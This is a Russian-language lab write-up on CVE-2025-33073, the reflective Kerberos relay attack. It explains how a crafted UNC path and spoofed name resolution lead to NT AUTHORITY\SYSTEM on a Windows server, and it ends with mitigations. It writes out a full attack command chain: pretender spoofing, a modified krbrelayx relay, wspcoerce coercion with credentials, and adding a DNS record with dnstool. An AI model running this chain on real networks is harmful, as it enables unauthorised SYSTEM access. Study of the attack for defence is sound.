# Reflective Kerberos Relay Attack — CVE-2025-33073

> [!abstract] Информация  
> **Исследование:** RedTeam Pentesting  
> **Дата публикации:** июнь 2025  
> **Патч Microsoft:** 10 июня 2025  
> **Уязвимость:** CVE-2025-33073  
> **Тип:** Kerberos Reflective Relay / Privilege Escalation  
> **Источник:** [https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/)

---

# 1. Архитектура лаборатории

Для начала разберёмся, какие машины участвуют в атаке.

```
flowchart TB
    subgraph DOMAIN["Доменная инфраструктура — ttt.local"]
        DC["🖥️ DC01<br/>10.0.0.1<br/>Domain Controller<br/>KDC + AD DNS"]
        DB["🖥️ DB<br/>10.0.0.2<br/>Windows Server<br/>Жертва"]
        DC -->|"Kerberos TGS-REQ / TGS-REP"| DB
    end

    subgraph ATTACKER["Атакующая машина"]
        KALI["🐉 Kali Linux<br/>10.0.0.99"]
        P["Pretender<br/>DNS / mDNS spoofing"]
        R["Modified krbrelayx<br/>Kerberos Relay :445"]
        KALI --> P
        KALI --> R
    end

    KALI -.->|"Coercion через DCERPC"| DB
    DB -.->|"AP-REQ"| KALI

    style DC fill:#263b57,color:#fff
    style DB fill:#654b27,color:#fff
    style KALI fill:#713c3c,color:#fff
    style P fill:#315c47,color:#fff
    style R fill:#315c47,color:#fff
```

### Параметры стенда

|Параметр|Значение|
|---|---|
|Domain Controller|`dc01.ttt.local`|
|DC IP|`10.0.0.1`|
|Victim|`db.ttt.local`|
|Victim IP|`10.0.0.2`|
|Attacker|`kali`|
|Attacker IP|`10.0.0.99`|
|Domain|`ttt.local`|
|Domain user|`user1`|
|Credentials|`Password123`|

---

# 2. Суть уязвимости

> [!danger] Главная идея  
> Windows может использовать разные значения для определения целевого Kerberos SPN и фактического сетевого адреса подключения.

В результате возникает необычная ситуация:

- Жертва получает Kerberos ticket для собственного SMB-сервиса.
    
- Но отправляет AP-REQ не себе, а атакующему.
    
- Атакующий перенаправляет полученный AP-REQ обратно на жертву.
    
- Windows повторно использует SYSTEM token исходного процесса.
    

## Как выглядит проблема

```
flowchart LR
    A["DB<br/>Windows Server"]
    B["KDC<br/>Domain Controller"]
    C["Kali<br/>Attacker"]

    A -->|"TGS-REQ<br/>cifs/db.ttt.local"| B
    B -->|"TGS-REP<br/>Ticket для DB$"| A

    A -->|"AP-REQ<br/>Ticket для DB"| C

    C -->|"Relay того же AP-REQ"| A

    A -->|"SYSTEM token reuse"| D["NT AUTHORITY\\SYSTEM"]

    style A fill:#654b27,color:#fff
    style B fill:#263b57,color:#fff
    style C fill:#713c3c,color:#fff
    style D fill:#315c47,color:#fff
```

**Ключевое различие:**

|Компонент|Значение|
|---|---|
|SPN в Kerberos ticket|`cifs/db.ttt.local`|
|Реальный адрес подключения|`10.0.0.99`|
|Получатель AP-REQ|Kali|
|Конечная цель Relay|`db.ttt.local`|
|Результат|`NT AUTHORITY\SYSTEM`|

---

# 3. UNC Path Manipulation

## 3.1. Обычный UNC

Стандартный UNC-путь:

```
\\server.corp.local\share
```

Windows воспринимает его следующим образом:

```
flowchart TD
    A["UNC: \\\\server.corp.local\\share"]
    B["Извлечение hostname"]
    C["server.corp.local"]
    D["Формирование SPN"]
    E["cifs/server.corp.local"]
    F["Получение Kerberos TGS"]
    G["Подключение к server.corp.local"]

    A --> B --> C --> D --> E --> F --> G

    style E fill:#315c47,color:#fff
```

Здесь всё стандартно: hostname и целевой SPN соответствуют одному серверу.

## 3.2. Специально сформированный UNC

В исследуемой атаке используется другой путь:

```
file:////db1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA/path
```

В hostname находится закодированная структура:

`CREDENTIAL_TARGET_INFORMATIONW`

```
flowchart TD
    A["Специальный UNC Path"]
    B["Hostname с encoded blob"]
    C["CredUnmarshalTargetInfo()"]
    D["CREDENTIAL_TARGET_INFORMATIONW"]

    A --> B --> C --> D

    D --> E["TargetName<br/>db.ttt.local"]
    D --> F["DnsServerName<br/>db.ttt.local"]
    D --> G["DnsDomainName<br/>ttt.local"]
    D --> H["Flags<br/>0"]

    E --> I["SPN: cifs/db.ttt.local"]

    style D fill:#263b57,color:#fff
    style I fill:#315c47,color:#fff
```

### Содержимое структуры

```
CREDENTIAL_TARGET_INFORMATIONW {
    TargetName:    L"db.ttt.local",
    DnsServerName: L"db.ttt.local",
    DnsDomainName: L"ttt.local",
    Flags:         0
}
```

### Что происходит внутри Windows

1. Windows получает UNC-путь.
    
2. Обнаруживает encoded blob в hostname.
    
3. Вызывает `CredUnmarshalTargetInfo()`.
    
4. Извлекает `TargetName = db.ttt.local`.
    
5. Использует это значение для формирования SPN.
    
6. При этом сетевое разрешение hostname происходит отдельно.
    

Именно это разделение и создаёт возможность Reflective Relay.

> [!info] Важный момент  
> Техника `CredMarshalTargetInfo` разработана James Forshaw (Google Project Zero).

---

# 4. Разделение SPN и сетевого адреса

Это центральный механизм всей атаки.

```
flowchart TB
    A["Windows получает UNC Path"]
    
    A --> B["Credential Target Information"]
    A --> C["DNS / mDNS hostname resolution"]

    B --> D["TargetName"]
    D --> E["cifs/db.ttt.local"]
    E --> F["KDC"]
    F --> G["TGS для DB"]

    C --> H["db1UWhRCA..."]
    H --> I["Pretender"]
    I --> J["10.0.0.99"]
    J --> K["Kali Linux"]

    G --> L["Windows формирует AP-REQ"]
    K --> M["Получение AP-REQ"]

    L --> M

    style E fill:#315c47,color:#fff
    style K fill:#713c3c,color:#fff
    style M fill:#654b27,color:#fff
```

Получается два независимых процесса:

|Процесс|Результат|
|---|---|
|Определение Kerberos SPN|`cifs/db.ttt.local`|
|Разрешение hostname|`10.0.0.99`|

Поэтому Kerberos ticket предназначен для DB, но сетевое соединение устанавливается с Kali.

---

# 5. Подготовка инфраструктуры

> [!warning] Порядок запуска важен  
> Сначала запускаются сетевые listeners, затем инициируется принудительная аутентификация.

## Terminal 1 — Pretender

DNS spoofing через mDNS, LLMNR и NetBIOS-NS.

```
sudo pretender -i eth0 \
  --no-dhcp-dns \
  --no-timestamps \
  --spoof '*1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA*'
```

**Назначение:**

- Слушает mDNS — UDP/5353.
    
- Слушает LLMNR — UDP/5355.
    
- Слушает NetBIOS-NS — UDP/137.
    
- Отвечает на запросы, содержащие заданный wildcard.
    
- Возвращает IP атакующей машины `10.0.0.99`.
    

## Terminal 2 — Modified krbrelayx

```
krbrelayx.py \
  --target smb://db.ttt.local \
  -c whoami
```

**Назначение:**

- Принимает входящий Kerberos AP-REQ.
    
- Перенаправляет аутентификацию на DB.
    
- Использует модифицированную обработку SPNEGO.
    
- Выполняет `whoami` после успешной аутентификации.
    

### Особенность SPNEGO

Модифицированный listener возвращает только Kerberos:

```
SecurityBlob: SPNEGO {
    negTokenInit {
        mechTypes: [
            1.3.6.1.5.5.2
        ]
    }
}
```

OID `1.3.6.1.5.5.2` — SPNEGO.

В данном сценарии жертва видит отсутствие NTLM среди предлагаемых механизмов и переходит к Kerberos.

## Terminal 3 — Coercion

```
wspcoerce 'ttt.local/user1:Password123@db.ttt.local' \
  'file:////db1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA/share'
```

**Назначение:**

- Использует DCERPC pipe `MsFteWds`.
    
- Инициирует принудительную аутентификацию.
    
- Передаёт жертве специально сформированный UNC-путь.
    
- Заставляет DB обратиться к адресу, контролируемому атакующим.
    

---

# 6. Полная последовательность атаки

Это основная диаграмма, которую удобно использовать для повторения механизма атаки.

## Phase 0 — Preparation

```
flowchart TB
    K["Kali Linux"]

    K --> P["Pretender"]
    K --> R["krbrelayx"]

    P --> P1["Ожидание DNS / mDNS запросов"]
    R --> R1["Ожидание Kerberos AP-REQ"]

    P1 --> READY["Listeners готовы"]
    R1 --> READY

    READY --> NEXT["Можно инициировать Coercion"]

    style READY fill:#315c47,color:#fff
```

## Phase 1 — Coercion

Атакующий инициирует принудительную аутентификацию через `MsFteWds`.

```
sequenceDiagram
    autonumber
    participant K as Kali
    participant DB as DB (Victim)

    K->>DB: DCERPC request
    Note right of DB: Pipe: MsFteWds

    K->>DB: UNC path с encoded blob

    Note over DB: Windows обрабатывает UNC
    Note over DB: CredUnmarshalTargetInfo()

    DB->>DB: Извлечение TargetName
    Note right of DB: TargetName = db.ttt.local
```

**Результат:** Windows получила специальную информацию о целевой Kerberos-идентичности.

## Phase 2 — Kerberos TGS Request

Теперь жертва обращается к KDC за тикетом.

```
sequenceDiagram
    autonumber
    participant DB as DB (Victim)
    participant DC as DC01 (KDC)

    DB->>DC: TGS-REQ
    Note over DB,DC: sname = cifs/db.ttt.local

    DC->>DB: TGS-REP
    Note over DB: Ticket для cifs/db.ttt.local
    Note over DB: Шифрование ключом DB$
```

**Обрати внимание:** жертва самостоятельно запрашивает тикет для собственного SMB-сервиса.

## Phase 3 — DNS Spoofing и AP-REQ

Следующий этап — заставить Windows подключиться к Kali.

```
sequenceDiagram
    autonumber
    participant DB as DB (Victim)
    participant P as Pretender (Kali)
    participant R as krbrelayx (Kali)

    DB->>P: mDNS query: db1UWhRC...?
    P->>DB: mDNS response: 10.0.0.99

    Note over DB: Подключение к Kali
    DB->>R: SMB / SPNEGO negotiation

    R->>DB: SPNEGO: только Kerberos

    Note over DB: Формирование Kerberos AP-REQ
    DB->>R: AP-REQ

    Note right of R: Ticket для cifs/db.ttt.local
    Note right of R: Authenticator = DB$
```

**Результат:** Kali получает Kerberos AP-REQ, содержащий тикет, предназначенный для DB.

## Phase 4 — Reflective Relay

Самый интересный этап.

Атакующий отправляет полученный AP-REQ обратно на исходную машину.

```
sequenceDiagram
    autonumber
    participant K as Kali / krbrelayx
    participant DB as DB (Victim)

    K->>DB: Relay исходного AP-REQ

    Note over DB: Проверка Kerberos Ticket
    DB->>DB: Расшифровка ключом DB$
    DB->>DB: Проверка SPN cifs/db.ttt.local

    Note over DB: Проверка KERB_LOCAL
    DB->>DB: Проверка исходного процесса

    DB->>DB: Reuse SYSTEM Token

    DB-->>K: Результат выполнения команды
```

### Почему проверка проходит?

В исходном исследовании описаны следующие проверки:

|Проверка|Результат|
|---|---|
|Расшифровка ticket ключом DB$|Успешно|
|Совпадение SPN|Успешно|
|Проверка KERB_LOCAL|Привязка к исходному SYSTEM process|
|Повторное использование токена|SYSTEM|

---

# 7. Почему результатом становится SYSTEM?

Здесь необходимо понимать механизм Windows loopback protection и token reuse.

## Обычный loopback

В обычном сценарии процесс аутентифицируется сам к себе.

```
flowchart TD
    A["Process A<br/>Обычный пользователь"]
    B["Kerberos Authentication"]
    C["KERB_LOCAL"]
    D["Проверка исходного процесса"]
    E["Process A"]
    F["Токен Process A"]

    A --> B --> C --> D
    D --> E --> F

    style F fill:#654b27,color:#fff
```

Токен остаётся в контексте исходного пользователя.

## CVE-2025-33073

В исследуемом сценарии исходную аутентификацию инициирует процесс, работающий с SYSTEM-контекстом.

```
flowchart TD
    A["SYSTEM Process"]
    B["Kerberos Authentication"]
    C["KERB_LOCAL содержит привязку"]
    D["Kali перехватывает AP-REQ"]
    E["Relay обратно на DB"]
    F["Проверка KERB_LOCAL"]
    G["Обнаруживается исходный SYSTEM process"]
    H["SYSTEM Token Reuse"]
    I["NT AUTHORITY\\SYSTEM"]

    A --> B --> C --> D --> E --> F --> G --> H --> I

    style A fill:#654b27,color:#fff
    style I fill:#315c47,color:#fff
```

### Важные структуры

|Структура|Назначение|
|---|---|
|`KERB_AD_RESTRICTION_ENTRY`|Machine ID, процесс, integrity level|
|`KERB_LOCAL`|Loopback-идентификатор (PID + session)|

> [!danger] Главная особенность  
> Согласно исследованию, при обработке отражённой аутентификации Windows повторно использует SYSTEM token исходного процесса, вместо создания нового токена с обычными правами.

---

# 8. DNS Poisoning: когда работает, а когда нет

## Условия успешного разрешения hostname

```
flowchart TD
    A["Windows разрешает blob hostname"]
    B{"Есть легитимная DNS-запись?"}
    C["DNS возвращает легитимный адрес"]
    D["Проверка mDNS / LLMNR"]
    E{"Атакующий доступен в L2?"}
    F["Pretender отвечает"]
    G["Hostname разрешён в 10.0.0.99"]
    H["Соединение с Kali"]
    X["DNS spoofing не срабатывает"]

    A --> B
    B -->|Да| C
    B -->|Нет| D
    D --> E
    E -->|Да| F --> G --> H
    E -->|Нет| X

    style H fill:#315c47,color:#fff
    style X fill:#713c3c,color:#fff
```

## Работает

|Условие|Причина|
|---|---|
|mDNS включён|Broadcast-запросы доступны|
|LLMNR включён|Дополнительный механизм разрешения имён|
|Нет легитимной DNS-записи|Можно получить ответ от Pretender|
|Kali в том же L2|Broadcast достигает атакующего|

## Не работает

|Условие|Причина|
|---|---|
|mDNS/LLMNR заблокированы GPO|Broadcast блокируется|
|Разные VLAN|Broadcast не проходит|
|Credential Guard|Kerberos изолирован|
|SMB signing enforced|SMB relay не позволяет выполнить команду|

---

# 9. Альтернативный способ: AD DNS Record

Если mDNS/LLMNR недоступны, в исследовании рассматривается использование записи в AD DNS.

```
flowchart TD
    A["Атакующий"]
    B["AD DNS"]
    C["Добавление A-записи"]
    D["Blob hostname"]
    E["10.0.0.99"]
    F["Жертва выполняет DNS-запрос"]
    G["Получает адрес Kali"]
    H["AP-REQ отправляется атакующему"]

    A --> B --> C --> D --> E
    F --> B
    E --> G --> H

    style H fill:#713c3c,color:#fff
```

Пример команды из исследования:

```
python3 krbrelayx/dnstool.py \
  -u 'ttt.local\user1' \
  -p 'Password123' \
  --action add \
  --record 'db1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' \
  --data '10.0.0.99' \
  --type A \
  dc01.ttt.local
```

Теперь DC DNS разрешает blob hostname в IP атакующей машины.

> [!info] Примечание  
> Этот вариант требует учётную запись домена с достаточными правами для изменения соответствующей DNS-записи.

---

# 10. Условия эксплуатации

```
flowchart TD
    A["CVE-2025-33073"]
    A --> B{"Coercion доступен?"}
    B -->|Нет| X["Атака не проходит"]
    B -->|Да| C{"Есть способ DNS resolution?"}
    C -->|Нет| X
    C -->|Да| D{"Kerberos relay возможен?"}
    D -->|Нет| X
    D -->|Да| E{"Есть ограничения SMB signing?"}
    E -->|Да| F["SMB relay блокируется"]
    E -->|Нет| G["Продолжение атаки"]
    G --> H["Reflective Relay"]
    H --> I["SYSTEM"]

    style I fill:#315c47,color:#fff
    style X fill:#713c3c,color:#fff
    style F fill:#654b27,color:#fff
```

|Условие|Особенность|
|---|---|
|SMB signing не enforced|SMB relay может быть возможен|
|Coercion через MsFteWds|Инициирование аутентификации|
|mDNS/LLMNR или AD DNS|Разрешение blob hostname|
|Низкоправная доменная учётка|Используется для `wspcoerce`|

---

# 11. Используемые инструменты

|Инструмент|Назначение|
|---|---|
|`wspcoerce`|DCERPC coercion через MsFteWds|
|`pretender`|mDNS / LLMNR / NetBIOS spoofing|
|`krbrelayx` (modified)|Kerberos relay|
|`dnstool.py`|Добавление AD DNS-записи|

### Репозитории

- Pretender: [https://github.com/RedTeamPentesting/pretender](https://github.com/RedTeamPentesting/pretender)
    
- krbrelayx: [https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)
    
- Original research: [https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/)
    

---

# 12. Mitigation — защита

```
flowchart TD
    A["Защита от CVE-2025-33073"]

    A --> B["Microsoft Security Updates"]
    A --> C["SMB Signing"]
    A --> D["LDAP Signing + Channel Binding"]
    A --> E["Отключение mDNS / LLMNR"]
    A --> F["Ограничение MsFteWds"]
    A --> G["Network Segmentation"]

    B --> B1["Закрытие уязвимости"]
    C --> C1["Защита SMB relay"]
    D --> D1["Защита LDAP relay"]
    E --> E1["Снижение DNS spoofing"]
    F --> F1["Снижение возможностей coercion"]
    G --> G1["Изоляция атакующего от L2"]

    style B fill:#315c47,color:#fff
    style C fill:#315c47,color:#fff
    style D fill:#315c47,color:#fff
```

|Мера|Что предотвращает|
|---|---|
|Установка Microsoft Patch (июнь 2025)|CVE-2025-33073|
|SMB Signing enforced|SMB relay|
|LDAP Signing + Channel Binding|LDAP relay|
|Отключение mDNS / LLMNR|DNS poisoning|
|Ограничение MsFteWds pipe|Coercion|
|Network Segmentation|Доступ атакующего к L2-сегменту|

---

# 13. Итоговая схема всей атаки

> [!danger] Reflective Kerberos Relay — CVE-2025-33073

```
flowchart TB
    START(["Начало атаки"])

    subgraph PREP["1. Подготовка"]
        P["Pretender<br/>DNS spoofing"]
        R["krbrelayx<br/>Kerberos listener"]
    end

    subgraph COERCE["2. Coercion"]
        W["wspcoerce"]
        U["Специальный UNC Path"]
        M["MsFteWds"]
    end

    subgraph KERB["3. Kerberos"]
        C["CredUnmarshalTargetInfo"]
        S["TargetName = db.ttt.local"]
        T["TGS-REQ"]
        T2["TGS-REP"]
    end

    subgraph NETWORK["4. Перенаправление"]
        DNS["mDNS / DNS resolution"]
        IP["10.0.0.99"]
        AP["AP-REQ → Kali"]
    end

    subgraph RELAY["5. Reflective Relay"]
        RP["Relay AP-REQ → DB"]
        V["Проверка Ticket / SPN"]
        L["KERB_LOCAL"]
        TR["SYSTEM Token Reuse"]
    end

    END(["NT AUTHORITY\\SYSTEM"])

    START --> P
    START --> R
    P --> W
    R --> AP

    W --> U --> M --> C
    C --> S --> T --> T2
    T2 --> DNS
    DNS --> IP --> AP
    AP --> RP --> V --> L --> TR --> END

    style START fill:#263b57,color:#fff
    style END fill:#315c47,color:#fff
    style AP fill:#713c3c,color:#fff
    style TR fill:#654b27,color:#fff
```

## Что нужно запомнить

1. `CREDENTIAL_TARGET_INFORMATIONW` позволяет задать целевой Kerberos SPN отдельно от hostname, используемого для сетевого подключения.
    
2. Жертва получает TGS для собственного SMB-сервиса.
    
3. DNS spoofing перенаправляет сетевое соединение на атакующего.
    
4. Kali получает AP-REQ с тикетом, предназначенным для DB.
    
5. AP-REQ отражается обратно на исходный сервер.
    
6. В описанном исследовании механизм `KERB_LOCAL` приводит к повторному использованию SYSTEM token.
    

**Главная идея CVE-2025-33073:** сочетание управления Kerberos target information, перенаправления сетевого соединения и особенностей обработки локальной Kerberos-аутентификации позволяет получить привилегированный контекст на самой жертве.

---

# Источники

- RedTeam Pentesting — Reflective Kerberos Relay Attack (June 2025): [https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/)
    
- Microsoft Security Updates — June 10, 2025.
    
- James Forshaw — Google Project Zero, Credential Target Information research.
    
- Dirk-jan Mollema — krbrelayx: [https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)
    
- RedTeam Pentesting — Pretender: [https://github.com/RedTeamPentesting/pretender](https://github.com/RedTeamPentesting/pretender)
    

---

# Obsidian: полезные ссылки

- [[Kerberos]]
    
- [[Kerberos Authentication]]
    
- [[TGS-REQ]]
    
- [[TGS-REP]]
    
- [[SPN]]
    
- [[AP-REQ]]
    
- [[SPNEGO]]
    
- [[NTLM Relay]]
    
- [[Kerberos Relay]]
    
- [[Windows Authentication]]
    
- [[Privilege Escalation]]
    
- [[DNS Poisoning]]
    
- [[LLMNR Poisoning]]
    
- [[CVE-2025-33073]]